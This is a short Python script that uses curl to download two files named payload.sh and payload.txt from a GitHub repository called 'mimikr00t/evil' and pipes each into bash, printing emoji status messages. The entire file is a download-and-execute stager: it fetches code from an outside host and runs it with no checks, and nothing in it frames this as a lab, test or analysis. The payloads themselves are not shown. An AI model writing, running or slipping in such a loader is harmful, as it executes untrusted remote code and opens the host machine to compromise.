import subprocess

urls = [
    "https://raw.githubusercontent.com/mimikr00t/evil/refs/heads/main/payload.sh",
    "https://raw.githubusercontent.com/mimikr00t/evil/refs/heads/main/payload.txt"
]

for i, url in enumerate(urls, 1):
    print(f"🚀 Processing script {i}/2: {url.split('/')[-1]}")
    
    # Download the script
    download_result = subprocess.run(["curl", "-s", url], capture_output=True, text=True, shell=False)

    if download_result.returncode == 0:
        script_content = download_result.stdout
        
        if script_content.strip():  # Check if not empty
            print(f"📥 Downloaded {len(script_content)} bytes")
            
            # Execute the script
            execute_result = subprocess.run(["bash"], input=script_content, text=True, shell=False)
            
            print(f"✅ Execution completed for script {i} | Return code: {execute_result.returncode}")
            
            # Show output/errors
            if execute_result.stdout:
                print(f"📤 Output: {execute_result.stdout.strip()}")
            if execute_result.stderr:
                print(f"❌ Errors: {execute_result.stderr.strip()}")
        else:
            print(f"⚠️  Script {i} is empty, skipping")
    else:
        print(f"❌ Download failed for script {i}")

print("🎯 All scripts processed")
